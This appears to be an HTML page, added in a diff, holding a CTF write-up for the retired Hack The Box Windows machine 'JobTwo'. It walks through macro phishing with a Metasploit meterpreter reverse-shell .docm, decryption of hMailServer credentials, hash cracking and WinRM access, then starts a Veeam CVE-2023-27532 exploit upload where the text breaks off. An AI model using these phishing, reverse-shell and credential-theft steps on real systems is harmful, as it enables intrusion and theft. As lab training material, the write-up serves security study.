@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>JobTwo | Paracausal Telemetry</title><meta name="description" content="Hard Hack The Box Windows machine, written up by Ethan Bauer. Covers SSH (22), SMTP (25), HTTP (80)." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-jobtwo/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="JobTwo" /><meta property="og:description" content="Hard Hack The Box Windows machine, written up by Ethan Bauer. Covers SSH (22), SMTP (25), HTTP (80)." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-jobtwo/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-jobtwo/og.png?v=5d95b012" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="JobTwo" /><meta name="twitter:description" content="Hard Hack The Box Windows machine, written up by Ethan Bauer. Covers SSH (22), SMTP (25), HTTP (80)." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-jobtwo/og.png?v=5d95b012" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"JobTwo","description":"Hard Hack The Box Windows machine, written up by Ethan Bauer. Covers SSH (22), SMTP (25), HTTP (80).","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-jobtwo/","datePublished":"2026-10-31","keywords":"Hack The Box, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"JobTwo","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-jobtwo/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">JobTwo</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-10-31 · 9 min read</p><h1>JobTwo</h1><p>Hard Hack The Box Windows machine, written up by Ethan Bauer. Covers SSH (22), SMTP (25), HTTP (80).</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · hard</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/JobTwo" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-jobtwo.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-jobtwo.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>JobTwo</h2><p>JobTwo is a hard-diffculty Windows machine that involves a macro phishing attack for initial foothold. The box has hMailServer installed, which includes a configuration file containing encrypted credentials for the database connection. After extracting the password database, we…</p></div><span class="room-badge room-badge-hard">Hard</span></div><dl class="room-facts"><div><dt>Released</dt><dd>6 Nov 2025</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creator</dt><dd>xct</dd></div><div><dt>Rating</dt><dd>4.8 / 5</dd></div><div><dt>User owns</dt><dd>244</dd></div><div><dt>Root owns</dt><dd>228</dd></div><div><dt>User blood</dt><dd>HTB-Bot<small class="room-blood-time">0H 0M 2S</small></dd></div><div><dt>Root blood</dt><dd>HTB-Bot<small class="room-blood-time">0H 0M 2S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 134 votes from easiest to hardest"><rect x="0" y="59" width="20" height="5" rx="2" fill="hsl(96 70% 55%)"><title>3 votes</title></rect><rect x="26" y="60" width="20" height="4" rx="2" fill="hsl(96 70% 55%)"><title>2 votes</title></rect><rect x="52" y="43" width="20" height="21" rx="2" fill="hsl(80 70% 55%)"><title>12 votes</title></rect><rect x="78" y="37" width="20" height="27" rx="2" fill="hsl(70 70% 55%)"><title>15 votes</title></rect><rect x="104" y="16" width="20" height="48" rx="2" fill="hsl(50 70% 55%)"><title>27 votes</title></rect><rect x="130" y="18" width="20" height="46" rx="2" fill="hsl(38 70% 55%)"><title>26 votes</title></rect><rect x="156" y="0" width="20" height="64" rx="2" fill="hsl(28 70% 55%)"><title>36 votes</title></rect><rect x="182" y="46" width="20" height="18" rx="2" fill="hsl(16 70% 55%)"><title>10 votes</title></rect><rect x="208" y="62" width="20" height="2" rx="2" fill="hsl(8 70% 55%)"><title>1 votes</title></rect><rect x="234" y="60" width="20" height="4" rx="2" fill="hsl(0 70% 55%)"><title>2 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 5.9, Real-Life 5.6, CVE 6.3, Custom Exploitation 3.8, CTF-Like 4.4"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,68.7 147.3,97.9 135.9,145.7 94.4,131.5 80.7,100.5" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/JobTwo" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nmap -p- --min-rate=2000 -sT -Pn 10.129.238.35 -vv
+
+Host is up, received user-set (0.014s latency).
+Scanned at 2026-10-31 19:29:56 GMT for 197s
+Not shown: 65508 filtered tcp ports (no-response)
+PORT      STATE SERVICE       REASON
+22/tcp    open  ssh           syn-ack
+25/tcp    open  smtp          syn-ack
+80/tcp    open  http          syn-ack
+111/tcp   open  rpcbind       syn-ack
+135/tcp   open  msrpc         syn-ack
+139/tcp   open  netbios-ssn   syn-ack
+443/tcp   open  https         syn-ack
+445/tcp   open  microsoft-ds  syn-ack
+1063/tcp  open  kyoceranetdev syn-ack
+2049/tcp  open  nfs           syn-ack
+3389/tcp  open  ms-wbt-server syn-ack
+5985/tcp  open  wsman         syn-ack
+6160/tcp  open  ecmp          syn-ack
+6161/tcp  open  patrol-ism    syn-ack
+6162/tcp  open  patrol-coll   syn-ack
+6169/tcp  open  unknown       syn-ack
+6170/tcp  open  unknown       syn-ack
+6190/tcp  open  unknown       syn-ack
+6210/tcp  open  unknown       syn-ack
+6290/tcp  open  unknown       syn-ack
+10001/tcp open  scp-config    syn-ack
+10002/tcp open  documentum    syn-ack
+10003/tcp open  documentum_s  syn-ack
+10005/tcp open  stel          syn-ack
+10006/tcp open  netapp-sync   syn-ack
+11731/tcp open  unknown       syn-ack
+49669/tcp open  unknown       syn-ack
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 197.42 seconds</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nmap -p 22,25,80,111,135,139,443,445,1063,2049,3389,5985,6160,6161,6162,6169,6170,6190,6210,6290,10001,10002,10003,10005,10006,11731 -A --min-rate=2000 -sT -Pn 10.129.238.35 
+Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-31 19:36 +0000
+Nmap scan report for 10.129.238.35
+Host is up (0.014s latency).
+
+PORT      STATE SERVICE              VERSION
+22/tcp    open  ssh                  OpenSSH for_Windows_9.5 (protocol 2.0)
+25/tcp    open  smtp                 hMailServer smtpd
+| smtp-commands: JOB2, SIZE 20480000, AUTH LOGIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+80/tcp    open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+111/tcp   open  rpcbind
+135/tcp   open  msrpc                Microsoft Windows RPC
+139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
+443/tcp   open  ssl/https?
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=www.job2.vl
+| Subject Alternative Name: DNS:job2.vl, DNS:www.job2.vl
+| Not valid before: 2023-05-09T13:31:40
+|_Not valid after:  2122-05-09T13:41:37
+| tls-alpn: 
+|   h2
+|_  http/1.1
+445/tcp   open  microsoft-ds?
+1063/tcp  open  rpcbind
+2049/tcp  open  rpcbind
+3389/tcp  open  ms-wbt-server        Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: JOB2
+|   NetBIOS_Domain_Name: JOB2
+|   NetBIOS_Computer_Name: JOB2
+|   DNS_Domain_Name: JOB2
+|   DNS_Computer_Name: JOB2
+|   Product_Version: 10.0.20348
+|_  System_Time: 2026-10-31T20:39:07+00:00
+| ssl-cert: Subject: commonName=JOB2
+| Not valid before: 2026-10-30T20:28:01
+|_Not valid after:  2027-05-01T20:28:01
+|_ssl-date: 2026-10-31T20:39:38+00:00; +59m53s from scanner time.
+5985/tcp  open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+6160/tcp  open  msrpc                Microsoft Windows RPC
+6161/tcp  open  msrpc                Microsoft Windows RPC
+6162/tcp  open  msrpc                Microsoft Windows RPC
+6169/tcp  open  tcpwrapped
+6170/tcp  open  storagecraft-image   StorageCraft Image Manager
+6190/tcp  open  msrpc                Microsoft Windows RPC
+6210/tcp  open  msrpc                Microsoft Windows RPC
+6290/tcp  open  unknown
+10001/tcp open  msexchange-logcopier Microsoft Exchange 2010 log copier
+10002/tcp open  msexchange-logcopier Microsoft Exchange 2010 log copier
+10003/tcp open  storagecraft-image   StorageCraft Image Manager
+10005/tcp open  stel?
+10006/tcp open  netapp-sync?
+11731/tcp open  msrpc                Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
+OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: JOB2; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><h2>SSH (22)</h2><p><img src="images/jobtwo/pasted-image-20261031193222.webp" alt="Screenshot" loading="lazy" /></p><p>Password based auth</p><h2>SMTP (25)</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ telnet 10.129.238.35 25                                
+Trying 10.129.238.35...
+Connected to 10.129.238.35.
+Escape character is &#39;^]&#39;.
+220 JOB2 ESMTP
+HELO 10.129.238.35  
+250 Hello.
+AUTH NTLM 334
+504 Authentication mechanism not supported.</code></pre><p>It doesnt support NTLM</p><p>Not a whole lot i can do with SMTP at the moment</p><h2>HTTP (80)</h2><p>It looks like both port 80 and 443 are running the same service</p><p><img src="images/jobtwo/pasted-image-20261031194828.webp" alt="Screenshot" loading="lazy" /></p><p><img src="images/jobtwo/pasted-image-20261031194901.webp" alt="Screenshot" loading="lazy" /></p><p>Looks like i might have a user i might be able send an email to?</p><h2><code>.docm</code> macro phishing leads to meterpreter session</h2><p>So initilly i tried using the templates ntlm theft provides but both failed, but when i tried using macros.....</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">msf &gt; use exploit/multi/fileformat/office_word_macro
+msf exploit(multi/fileformat/office_word_macro) &gt; options
+
+Module options (exploit/multi/fileformat/office_word_macro):
+
+   Name            Current Setting               Required  Description
+   ----            ---------------               --------  -----------
+   CUSTOMTEMPLATE  /usr/share/metasploit-framew  yes       A docx file that will be used as a template to bu
+                   ork/data/exploits/office_wor            ild the exploit
+                   d_macro/template.docx
+   FILENAME        msf.docm                      yes       The Office document macro file (docm)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+   LHOST     192.168.86.128   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+   **DisablePayloadHandler: True   (no handler will be created!)**
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Microsoft Office Word on Windows
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(multi/fileformat/office_word_macro) &gt; set lhost tun0
+lhost =&gt; 10.10.14.61
+msf exploit(multi/fileformat/office_word_macro) &gt; set lport 1337
+lport =&gt; 1337
+msf exploit(multi/fileformat/office_word_macro) &gt; run
+[*] Using template: /usr/share/metasploit-framework/data/exploits/office_word_macro/template.docx
+[*] Injecting payload in document comments
+[*] Injecting macro and other required files in document
+[*] Finalizing docm: msf.docm
+[+] msf.docm stored at /home/kali/.msf4/local/msf.docm</code></pre><p>I started by using metasploit to create the file, then throwing my IP and port of choice</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">msf exploit(multi/fileformat/office_word_macro) &gt; use exploit/multi/handler 
+[*] Using configured payload generic/shell_reverse_tcp
+msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf exploit(multi/handler) &gt; options
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(multi/handler) &gt; set lhost tun0
+lhost =&gt; 10.10.14.61
+msf exploit(multi/handler) &gt; set lport 1337
+lport =&gt; 1337
+msf exploit(multi/handler) &gt; run
+[*] Started reverse TCP handler on 10.10.14.61:1337 </code></pre><p>Ill then set the listener, ill make sure to set the same payload as i did in the file generation, then simply add my IP and port in again</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ sendEmail -f attacker@job2.vl -t hr@job2.vl -u &#39;Job Application&#39; -m &#39;Here is my resume&#39; -a msf.docm -s job2.vl:25 
+Oct 31 20:16:19 localhost sendEmail[42304]: Email was sent successfully!</code></pre><p>Then ill send the email</p><p><img src="images/jobtwo/pasted-image-20261031202131.webp" alt="Screenshot" loading="lazy" /></p><p>And after a second i get a meterpreter session</p><h2>Credential hunting</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Program Files (x86)\hMailServer\Bin&gt; type hMailServer.INI
+type hMailServer.INI
+[Directories]
+ProgramFolder=C:\Program Files (x86)\hMailServer
+DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
+DataFolder=C:\Program Files (x86)\hMailServer\Data
+LogFolder=C:\Program Files (x86)\hMailServer\Logs
+TempFolder=C:\Program Files (x86)\hMailServer\Temp
+EventFolder=C:\Program Files (x86)\hMailServer\Events
+[GUILanguages]
+ValidLanguages=english,swedish
+[Security]
+AdministratorPassword=8a53bc0c0c9733319e5ee28dedce038e
+[Database]
+Type=MSSQLCE
+Username=
+Password=4e9989caf04eaa5ef87fd1f853f08b62
+PasswordEncryption=1
+Port=0
+Server=
+Database=hMailServer
+Internal=1
+PS C:\Program Files (x86)\hMailServer\Bin&gt; </code></pre><p>Ill look around the file system, and find what looks like encrypted creds</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ cat decrypt.py 
+from Crypto.Cipher import Blowfish
+
+def blowfish_decrypt_le(cipher_hex: str, key: bytes = b&quot;THIS_KEY_IS_NOT_SECRET&quot;) -&gt; str:
+    ct = bytes.fromhex(cipher_hex)
+    bs = Blowfish.block_size  # 8 bytes per block
+
+    cipher = Blowfish.new(key, Blowfish.MODE_ECB)
+    plaintext_bytes = b&#39;&#39;
+
+    for i in range(0, len(ct), bs):
+        block = ct[i:i+bs]
+        # Swap each 4-byte word (big-endian -&gt; little-endian)
+        le_block = block[:4][::-1] + block[4:][::-1]
+        # Decrypt
+        dec_le = cipher.decrypt(le_block)
+        # Swap words back
+        dec_be = dec_le[:4][::-1] + dec_le[4:][::-1]
+        plaintext_bytes += dec_be
+
+    # Strip trailing zero-byte padding
+    plaintext_bytes = plaintext_bytes.rstrip(b&#39;\x00&#39;)
+    return plaintext_bytes.decode(&#39;utf-8&#39;, errors=&#39;ignore&#39;)
+
+# Usage
+cipher_hex = &quot;4e9989caf04eaa5ef87fd1f853f08b62&quot;
+print(blowfish_decrypt_le(cipher_hex))</code></pre><p>Ill get AI to make me a script in python</p><p>Ill need the <code>pycryptodome</code> library to run this</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">(venv) ❯❯❯ python3 decrypt.py                                         
+95C02068FD5D</code></pre><p>I have decrypted the password</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Program Files (x86)\hMailServer\Database&gt; dir
+dir
+
+
+    Directory: C:\Program Files (x86)\hMailServer\Database
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----         11/1/2026   6:04 PM         675840 hMailServer.sdf                                                      
+
+
+PS C:\Program Files (x86)\hMailServer\Database&gt; </code></pre><p>This password is essentially used to protect this database file</p><p>So i need to open the file using the password</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Program Files (x86)\hMailServer&gt; mkdir C:\Temp
+PS C:\Program Files (x86)\hMailServer&gt; cp Database/hMailServer.sdf C:/Temp</code></pre><p>First ill create a dir i own, then copy the file to the dir i own</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Program Files (x86)\hMailServer&gt; Add-Type -Path &quot;C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v3.5\Desktop\System.Data.SqlServerCe.dll&quot;
+PS C:\Program Files (x86)\hMailServer&gt; $conn = New-Object System.Data.SqlServerCe.SqlCeConnection
+PS C:\Program Files (x86)\hMailServer&gt; $conn.ConnectionString = &quot;Data Source=C:\Temp\hMailServer.sdf;Password=95C02068FD5D&quot;
+PS C:\Program Files (x86)\hMailServer&gt; $conn.Open()</code></pre><p>This has setup the connection, when i now query the state it says open</p><p>Now i can use this connection to enumerate the DB</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">Julian@job2.vl    : 8981c81abda0acadf1d12dd9d213bac7c51c022a34268058af3757607075e0eb49f76f
+Ferdinand@job2.vl : 04063d4de2e5d06721cfbd7a31390d02d18941d392e86aabe02eda181d9702838baa11
+hr@job2.vl        : 1a5adad158ccffd81db73db040c72109067add598fafc47bbbd92da9a69661af94f055</code></pre><p>Then i can grab the hashes from <code>hm_accounts</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ hashcat hashes.txt --user /usr/share/wordlists/rockyou.txt
+
+04063d4de2e5d06721cfbd7a31390d02d18941d392e86aabe02eda181d9702838baa11:Franzi123!</code></pre><p>One of the hashes cracked</p><p>This is for the user <code>ferdinand</code></p><h2>Compromising <code>ferdinand</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nxc smb job2.vl -u &#39;Ferdinand&#39; -p &#39;Franzi123!&#39;
+SMB         10.129.238.35   445    JOB2             [*] Windows Server 2022 Build 20348 x64 (name:JOB2) (domain:JOB2) (signing:True) (SMBv1:None)
+SMB         10.129.238.35   445    JOB2             [+] JOB2\Ferdinand:Franzi123! </code></pre><p>This user is now compromised</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ nxc winrm job2.vl -u &#39;Ferdinand&#39; -p &#39;Franzi123!&#39;   
+WINRM       10.129.238.35   5985   JOB2             [*] Windows Server 2022 Build 20348 (name:JOB2) (domain:JOB2) 
+WINRM       10.129.238.35   5985   JOB2             [+] JOB2\Ferdinand:Franzi123! (Pwn3d!)</code></pre><p>This user also has access over WINRM</p><h2>WINRM access as <code>ferdinand</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ evil-winrm-py -i job2.vl -u Ferdinand -p &#39;Franzi123!&#39;                                        
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | &#39; \| &#39;_| &#39;  |___| &#39;_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.7.0
+
+[*] Connecting to &#39;job2.vl:5985&#39; as &#39;Ferdinand&#39;
+evil-winrm-py PS C:\Users\Ferdinand\Documents&gt;</code></pre><p>I now have access over WINRM</p><h2>CVE-2023-27532</h2><p><a href="https://www.rapid7.com/blog/post/ra-cve-2023-27532-analysis/" target="_blank" rel="noreferrer">https://www.rapid7.com/blog/post/ra-cve-2023-27532-analysis/</a></p><p><a href="https://github.com/puckiestyle/CVE-2023-27532-RCE-Only" target="_blank" rel="noreferrer">https://github.com/puckiestyle/CVE-2023-27532-RCE-Only</a></p><p>There is also a POC i found with pre compiled binaries to save me compiling it myself</p><p>Making an assumption i think ill need the .exe and the three .dll files from the repo</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\exploit&gt; upload VeeamHax.exe .
+Uploading /home/kali/htb/jobtwo/VeeamHax.exe 7.00k/7.00k [00:00&lt;00:00, 13.9kB/s]
+[+] File uploaded successfully as: C:\exploit\VeeamHax.exe
+evil-winrm-py PS C:\exploit&gt; upload Veeam.Backup.Common.dll .
+Uploading /home/kali/htb/jobtwo/Veeam.Backup.Common.dll: 1.81MB [00:03, 570kB/s]                                                                                                                                     
+[+] File uploaded successfully as: C:\exploit\Veeam.Backup.Common.dll
+evil-winrm-py PS C:\exploit&gt; upload Veeam.Backup.Interaction.MountService.dll .
